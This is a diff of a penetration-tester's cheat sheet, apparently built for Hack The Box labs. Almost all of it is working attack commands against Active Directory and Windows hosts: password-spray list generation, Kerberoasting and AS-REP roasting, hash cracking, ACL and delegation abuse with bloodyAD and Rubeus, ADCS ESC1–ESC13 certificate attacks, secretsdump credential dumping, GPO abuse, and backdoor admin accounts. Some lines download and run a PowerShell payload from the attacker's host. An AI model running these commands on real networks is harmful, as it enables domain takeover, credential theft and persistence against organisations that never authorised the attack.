@@ -90,151 +90,7 @@ sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_
 sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_$TARGET__24'
 sudo nmap -n -Pn -sS '$TARGET/24' --excludefile hosts_ -F --open --max-rate 50 -oA 'TCP_ALL_$TARGET__24'
 
-# Information Gathering (Pre-creds)
-## Create Custom Usernames List
-username-anarchy --input-file names --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
-username-anarchy Joe Kerr --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
-
-## Create Custom Passwords List
-sudo kwp -z /usr/local/bin/basechars/full.base /usr/local/bin/keymaps/en-us.keymap /usr/local/bin/routes/2-to-16-max-3-direction-changes.route > /usr/share/wordlists/keywalk.txt
-cewler -d 0 http://$TARGET/ -r 50
-psudohash.py -w Password -o passwords_custom_password
-spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-1)) --iter ascii -p -o passwords_custom_seasons_1_year
-spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-5)) --iter ascii -p -o passwords_custom_seasons_5_years
-spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-10)) --iter ascii -p -o passwords_custom_seasons_10_years
-psudohash.py -w Password -cpo -cpa -ap '!,?,%' -o passwords_custom_password_extended
-psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-1))-$(date +%Y) -o passwords_custom_seasons_1_year_extended
-psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-5))-$(date +%Y) -o passwords_custom_seasons_5_years_extended
-psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-10))-$(date +%Y) -o passwords_custom_seasons_10_years_extended
-
-## Sorting Lists
-cat usernames | sort -u | tee usernames
-cat passwords | sort -u | tee passwords
-cat pwned | sort -u | sort -k5,5
-
-## Web
-bannerme
-curl -si $TARGET | grep -oP '(?<=https?://)[^/\s]+' | cut -d '"' -f1
-echo | openssl s_client -connect $TARGET:443 2>/dev/null | awk '/subject=|issuer=/'
-domme ://$TARGET
-echo "$TARGET $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
-creds search pfsense
-creds search tomcat
-URL=http://$DOM; whatweb $URL; nuclei -u $URL
-dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --exclude-sizes 0 --exclude-status 404 --recursive --crawl -t 50 -o dirsearch.txt --format json -w /usr/share/wordlists/assetnote/assetnote_directories.txt -u ://$DOM
-ffuf -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fc 404 -t 50 -rate 5000 -fs 0 -fw 0 -u ://$DOM
-portnock $TARGET 3456 8234 62431 -v
-while true; do ssltest.py $TARGET |grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' || true; sleep 2; done
-
-## Infrastructure
-nxc smb hosts_ -u 'anonymous' -p '' --shares
-nxc ftp hosts_ -u 'anonymous' -p '' --ls
-cat computers | cut -d '$' -f1 > passwords_computers
-nxc smb hosts_ -u computers -p passwords_computers --no-brute --local-auth
-nmap -iL hosts_ --script "ldap* and not brute" -p 389 | awk '/Nmap scan report/{ip=$NF} /dnsHostName/{h[ip]=h[ip] ? h[ip]" "$3 : $3} END{for (i in h) print i, h[i]}' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
-for host in $(cat hosts_); do echo "================[  $host  ]================"; rpcclient -U "" -N $host -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]'; echo; done
-kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute
-impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
-creds search ftp
-nmap $TARGET --script "ssl* and not brute" -p 443
-KDOM=$(bash -c 'echo "${0^^}"' $DOM);KDC=$(bash -c 'echo "${0^^}"' $DC); echo -e "[libdefaults]\n default_realm = $KDOM\n dns_lookup_kdc = false\n dns_lookup_realm = false\n forwardable = true\n\n[realms]\n $KDOM = {\n  kdc = $KDC\n  admin_server = $KDC\n }\n\n[domain_realm]\n .$DOM = $KDOM\n $DOM = $KDOM" | sudo tee /etc/krb5.conf
-echo "$TARGET $DC $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
-wget ftp://$TARGET --ftp-user='anonymous' --ftp-password='' -np -nH -m -q -P ftp
-smbme $TARGET
-mkdir smb; smbclient //$TARGET/SHARENAME -N -D . -c 'lcd smb; recurse; prompt; mget *'
-impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]'
-tshark -r FILE.pcap -V | grep -iE 'cipher:|enctype:' | cut -d ':' -f2 | xargs -n1
-echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes
-cp hashes /mnt/c/hashcat
-cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
-
-
-# Exploitation (Post-creds)
-## Initial Enumeration
-[*] Bloodhound
-+---------- Start ----------+
-Set-Location "$env:USERPROFILE\Downloads"; docker compose down; docker volume rm @(docker volume ls -q | Select-String neo4j-data); docker compose up
-.\bloodhound-cli resetpwd
-http://127.0.0.1:7474
-neo4j:bloodhoundcommunityedition
-http://127.0.0.1:8080
-admin:RANDOM_PASSWORD
-
-+---------- Queries ----------+
--->> Privileges: Groups with Users and Computers
-MATCH p=(n)-[r*1..]-(m)
-WHERE (n:User OR n:Computer)
-  AND (m:User OR m:Computer)
-  AND ALL(x IN nodes(p) WHERE x:User OR x:Computer)
-RETURN p
-LIMIT 1000
-
-MATCH (g:Group)<-[:MemberOf]-(e)-[r1]->(n1)-[r2]->(n2)
-WHERE (e:User OR e:Computer)
-  AND NOT toLower(e.name) CONTAINS "admin"
-  AND NOT toLower(e.name) CONTAINS "guest"
-  AND NOT toLower(g.name) CONTAINS "admin"
-  AND NOT toLower(g.name) CONTAINS "guest"
-  AND NOT toLower(g.name) CONTAINS "domain users"
-  AND NOT toLower(n1.name) CONTAINS "admin"
-  AND NOT toLower(n1.name) CONTAINS "domain users"
-  AND NOT toLower(n2.name) CONTAINS "admin"
-  AND NOT toLower(n2.name) CONTAINS "domain users"
-  AND NOT (n1:Container AND toLower(n1.name) CONTAINS "users")
-  AND NOT (n2:Container AND toLower(n2.name) CONTAINS "users")
-WITH e, r1, n1, r2, n2
-OPTIONAL MATCH (n2)-[r3]->(connected)
-RETURN DISTINCT e, r1, n1, r2, n2, r3, connected
-LIMIT 1000
-
-## Decoding and Decompressing
-echo -n '6b,cf,2a,4b,6e,5a,ca,0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
-echo -n 'cGFzc3dvcmRpc2dvb2Q=' | base64 -d
-tar -xzvf backup.tar.gz -C .
-unzip backup.zip -d .
-
-## Spray Services
-sprayme '$USERNAME:$PASSWORD' <HOSTS_FILE>
-
-## Valid Creds
--->> Keep Clock Synced
-sudo skewme $TARGET
-
--->> Get Bloodhound Data
-impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
-bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DC_$TARGET --zip -c All; unzip $DC*_bloodhound.zip -d /Upload/bloodhound
-//$MYIP/$/Sharphound.exe --ldapusername '$USERNAME' --ldappassword '$PASSWORD'
-
--->> Get Usernames and Computers
-cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
-cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
-impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee usernames_$DC
-impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee computers_$DC
-
--->> Initial Attacks
-impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames_$DC
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames_$DC
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
-impacket-changepasswd $DOM/'$USERNAME:$PASSWORD'@$TARGET -k -p kpasswd -newpass '123qweasdF!'
-dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@'
-sudo responder -I tun0 -v
-dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
-dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
-
--->> Login or Execute Commands
-evil-winrm-py -i $TARGET -u '$USERNAME' -p '$PASSWORD'
-evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
-evil-winrm-py -i $DC -r $DOM
-impacket-psexec $DOM/'$USERNAME:$PASSWORD'@$TARGET
-impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
-impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
-impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
-
--->> Create Local Admin Account
-powershell -c "net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add"
-
+# Tech and Protocols
 ## Web
 [*] Web Shell
 +---------- Create ----------+
@@ -654,230 +510,6 @@ https://datafetcher.com/graphql-json-body-converter
 {  "query": "mutation { deleteOrganizationUser(input: {id:3}) { user { id username } }}"  }
 
 ## Infrastructure
-[*] Active Directory
-+---------- Guide ----------+
-https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
-
-+---------- .ccache ----------+
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD'; kcme
-
-+---------- .ccache to evil-winrm ----------+
-evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
-
-+---------- ReadGMSAPassword ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
-
-+---------- ReadLAPSPassword ----------+
-impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
-
-+---------- AddKeyCredentialLink ----------+
-certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'
-
-+---------- AddSelf ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; kcme
-
-+---------- Owns ----------+
-impacket-dacledit -dc-ip $TARGET $DOM/ -k -action 'write' -rights 'WriteMembers' -principal '$USERNAME' -target-dn 'DistinguishedName'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'
-
-+---------- GenericWrite ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
-certipy shadow auto -target $DC -u '$USERNAME' -k -account 'TargetUser'
-
-+---------- ForceChangePassword ----------+
-impacket-changepasswd $DOM/'TARGET_USER'@$TARGET -newpass '123qweasdF!' -altuser 'USER_WITH_PRIV' -althash '89d0b56874f61ad38bad336a77b8ef2f' -reset
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
-impacket-getTGT $DOM/'$USERNAME:123qweasdF!'; kcme
-
-+---------- Remove Protected ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'
-
-+---------- AddAllowedToAct / AllowedToAct ----------+
-Set-ADComputer -PrincipalsAllowedToDelegateToAccount "OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
-export OWNED_COMPUTER='' # without $ sign
-impacket-getTGT $DOM/"$OWNED_COMPUTER$":'$PASSWORD'; kcme
-impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache
-impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate backupadmin -spn "cifs/$DC"; mv *backupadmin@*.ccache administrator.ccache;
-kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:53/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
-
-$OWNED_COMPUTER='' # without $ sign
-Set-ADComputer -PrincipalsAllowedToDelegateToAccount "$OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
-$ComputerSid = Get-DomainComputer "$OWNED_COMPUTER" -Properties objectsid | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
-Get-DomainComputer DC_COMPUTER_NAME | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
-.\Rubeus.exe hash /password:OWNED_COMPUTER_PASSWORD
-.\Rubeus.exe s4u /user:"$OWNED_COMPUTER$" /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:administrator /msdsspn:cifs/dc.rustykey.htb /ptt /nowrap
-.\Rubeus.exe s4u /user:"$OWNED_COMPUTER$" /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:backupadmin /msdsspn:cifs/dc.rustykey.htb /ptt /nowrap
-[+] Ticket successfully imported!
-kirbi2ccache doIGfjCCBnqgAwIBB<SNIP>BASE64 HERE... administrator administrator.ccache;
-kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:53/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
-
-+---------- Forest Trust ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get trusts
-impacket-wmiexec -dc-ip $TARGET $DC -k -no-pass "powershell -c \"Import-Module 'ActiveDirectory'; @(Get-ADDomain | Select @{n='Name';e={$_.DNSRoot}},@{n='securityIdentifier';e={$_.DomainSID}},@{n='trustType';e={'Primary'}},@{n='trustDirection';e={'Inbound/Outbound'}}; Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -Properties * | Select @{n='Name';e={$_.Name}},@{n='securityIdentifier';e={$_.securityIdentifier}},@{n='trustType';e={switch ($_.trustType){1{'NT'}2{'Active Directory'}3{'External'}default{$_}}}},@{n='trustDirection';e={switch ($_.trustDirection){1{'Inbound'}2{'Outbound'}3{'Bidirectional'}default{$_}}}}) | Format-Table -AutoSize\""
-
-+---------- Add ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' 'USER'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'DistinguishedName' 'USER'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add user 'myuser' '123qweasdF!'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add computer 'mypc' '123qweasdF!'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add rbcd 'TARGET' 'SERVICE'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dcsync 'TRUSTEE'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'
-
-+---------- Get ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
-
-+---------- Search ----------+
--->> Computers
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
-
--->> Users
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info
-
--->> Members of Groups
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=group)(member=*))" --attr 'member','sAMAccountName' | sed -E '/^member: /{s/member: //;s/; */;\n/g;s/^/member:\n/;}' | tee out_membersofgroups-info
-
--->> Passwords and Keys
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=*))" | grep -a -Ei 'pass|pwd|key'
-
-+---------- Permissions ----------+
-adminCount
-AllExtendedRights
-description
-displayName
-distinguishedName
-ForceChangePassword
-GenericAll
-GenericWrite
-homeDirectory
-logonHours
-logonWorkstation
-member
-memberOf
-msDS-AllowedToActOnBehalfOfOtherIdentity
-msDS-AllowedToDelegateTo
-msDS-GroupMSAMembership
-msDS-KeyCredentialLink
-msDS-ManagedPassword
-msDS-PrimaryComputer
-primaryGroupID
-profilePath
-ResetPassword
-sAMAccountName
-scriptPath
-Self
-servicePrincipalName
-tokenGroups
-unicodePwd
-UserAccountControl
-ValidatedMSDS-AllowedToActOnBehalfOfOtherIdentity
-ValidatedSPN
-WriteDacl
-WriteOwner
-
-[*] Active Directory: CS
-+---------- Guide ----------+
-https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage
-
-+---------- .ccache ----------+
-impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
-impacket-getTGT $DOM/'$USERNAME' -hashes ':'; kcme
-
-+---------- Check Availablility ----------+
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
-
-+---------- Search Vulnerable ----------+
-certipy find -k -target $DC -dc-ip $TARGET -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
-
-+---------- AddKeyCredentialLink ----------+
-certipy shadow auto -k -target $DC -dc-ip $TARGET -account 'SVC_CABACKUP'
-
-+---------- ESC1 ----------+
-adminSid=$(certipy account -k -target $DC -dc-ip $TARGET -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -key-size '4096'
-certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
-change_password administrator 123qweasdF!
-impacket-getTGT $DOM/'administrator:123qweasdF!'; kcme
-evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
-evil-winrm-py -i $TARGET -u 'administrator' -p '123qweasdF!'
-
-+---------- ESC4 ----------+
-certipy template -k -target $DC -dc-ip $TARGET -template '' -write-default-configuration
-
-+---------- ESC7 ----------+
-certipy ca -k -target $DC -dc-ip $TARGET -ca "$CA" -add-officer '$USERNAME'
-certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'SubCA' -upn 'administrator' -key-size '4096' <<< 'y' | grep -v '[-]' | tee /dev/tty | awk '/Request ID is/ {printf "[*] Now use \x27%s.key\x27 in the following requests as -issue-request \x27%s\x27 and -retrieve \x27%s\x27\n", $5, $5, $5}'
-certipy ca -k -target $DC -dc-ip $TARGET -ca "$CA" -issue-request ''
-certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -retrieve ''
-certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'administrator.pfx'
-kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
-
-+---------- ESC10 ----------+
-certipy account update -k -target $DC -dc-ip $TARGET -user 'WRITEABLE_UPN' -upn 'DC01$@$DOM'
-certipy req -k -dc-ip $IP -target $DC -ca $CA -template 'User'
-certipy account update -k -target $DC -dc-ip $TARGET -user 'WRITEABLE_UPN' -upn 'ORIGINAL_UPN@$DOM'
-certipy auth -pfx DC01.pfx -dc-ip $IP -ldap-shell
-set_rbcd DC01$ WRITEABLE_OWNER_USER
-impacket-getST -k -no-pass -dc-ip $IP $DOM/'WRITEABLE_OWNER_USER' -spn 'cifs/DC01.mirage.htb' -impersonate DC01$
-impacket-secretsdump -k -no-pass $DC -just-dc-user Administrator
-
-+---------- ESC13 ----------+
-certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'VulnerableTemplate' -upn 'NEW_UPN' -key-size 4096
-certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'generated.pfx'; kcme
-certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'DifferentTemplate' -key-size 4096
-certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'generated.pfx'; kcme
-impacket-reg -dc-ip $TARGET $DOM -k -no-pass backup -o '\programdata'
-evil-winrm --> login --> cd \programdata; download SAM.save ... SECURITY.save ... SYSTEM.save ...
-impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local
-impacket-secretsdump DC01$@$DC -hashes '$MACHINE.ACC_HASH' -just-dc-ntlm
-
-+---------- Request ----------+
-certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
-certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -dynamic-endpoint
-
-+---------- Forge ----------+
-certutil -store my
-certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
-certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
-certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator_forged.pfx'
-change_password administrator 123qweasdF!
-impacket-getTGT $DOM/'administrator:123qweasdF!'; kcme
-evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
-evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'
-
-+---------- Authenticate ----------+
-certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
-change_password administrator 123qweasdF!
-impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
-impacket-getTGT $DOM/'administrator' -hashes ':'; kcme
-evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
-evil-winrm -i $TARGET -u administrator -H ''
-
-+---------- Crack ----------+
-pfx2john user.pfx
-openssl pkcs12 -in user.pfx -nocerts -out auth.key-enc
-openssl rsa -in auth.key-enc -out auth.key
-openssl pkcs12 -in user.pfx -clcerts -nokeys -out auth.crt
-evil-winrm -i $TARGET -S -k auth.key -c auth.crt
-
-[*] Active Directory: GPO
-+---------- Get ----------+
-Get-GPO -All
-Get-GPO -Name "Default Domain Controllers Policy"
-
-+---------- Permissions ----------+
-Get-GPPermission -Name "Default Domain Controllers Policy" -All
-Get-GPPermission -Name "Default Domain Controllers Policy" -TargetName "GPO Managers" -TargetType Group
-
-+---------- Execute ----------+
-python3 pygpoabuse.py -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -taskname 'Custom Task' -gpo-id '6ac1786c-016f-11d2-945f-00c04fb984f9'
-gpupdate /force
-impacket-getTGT $DOM/'myadmin':'123qweasdF!'; kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
-
 [*] Cracking
 +---------- Identify ----------+
 haiti cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
@@ -1430,6 +1062,151 @@ xfreerdp3 /v:'$TARGET' /d:'$DOM' /u:'$USERNAME' /p:'$PASSWORD' /cert:ignore /sec
 [*] (5985) WINRM
 evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
 evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
+
+# Information Gathering (Pre-creds)
+## Create Custom Usernames List
+username-anarchy --input-file names --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
+username-anarchy Joe Kerr --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
+
+## Create Custom Passwords List
+sudo kwp -z /usr/local/bin/basechars/full.base /usr/local/bin/keymaps/en-us.keymap /usr/local/bin/routes/2-to-16-max-3-direction-changes.route > /usr/share/wordlists/keywalk.txt
+cewler -d 0 http://$TARGET/ -r 50
+psudohash.py -w Password -o passwords_custom_password
+spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-1)) --iter ascii -p -o passwords_custom_seasons_1_year
+spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-5)) --iter ascii -p -o passwords_custom_seasons_5_years
+spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-10)) --iter ascii -p -o passwords_custom_seasons_10_years
+psudohash.py -w Password -cpo -cpa -ap '!,?,%' -o passwords_custom_password_extended
+psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-1))-$(date +%Y) -o passwords_custom_seasons_1_year_extended
+psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-5))-$(date +%Y) -o passwords_custom_seasons_5_years_extended
+psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-10))-$(date +%Y) -o passwords_custom_seasons_10_years_extended
+
+## Sorting Lists
+cat usernames | sort -u | tee usernames
+cat passwords | sort -u | tee passwords
+cat pwned | sort -u | sort -k5,5
+
+## Web
+bannerme
+curl -si $TARGET | grep -oP '(?<=https?://)[^/\s]+' | cut -d '"' -f1
+echo | openssl s_client -connect $TARGET:443 2>/dev/null | awk '/subject=|issuer=/'
+domme ://$TARGET
+echo "$TARGET $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
+creds search pfsense
+creds search tomcat
+URL=http://$DOM; whatweb $URL; nuclei -u $URL
+dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --exclude-sizes 0 --exclude-status 404 --recursive --crawl -t 50 -o dirsearch.txt --format json -w /usr/share/wordlists/assetnote/assetnote_directories.txt -u ://$DOM
+ffuf -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fc 404 -t 50 -rate 5000 -fs 0 -fw 0 -u ://$DOM
+portnock $TARGET 3456 8234 62431 -v
+while true; do ssltest.py $TARGET |grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' || true; sleep 2; done
+
+## Infrastructure
+nxc smb hosts_ -u 'anonymous' -p '' --shares
+nxc ftp hosts_ -u 'anonymous' -p '' --ls
+cat computers | cut -d '$' -f1 > passwords_computers
+nxc smb hosts_ -u computers -p passwords_computers --no-brute --local-auth
+nmap -iL hosts_ --script "ldap* and not brute" -p 389 | awk '/Nmap scan report/{ip=$NF} /dnsHostName/{h[ip]=h[ip] ? h[ip]" "$3 : $3} END{for (i in h) print i, h[i]}' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
+for host in $(cat hosts_); do echo "================[  $host  ]================"; rpcclient -U "" -N $host -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]'; echo; done
+kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
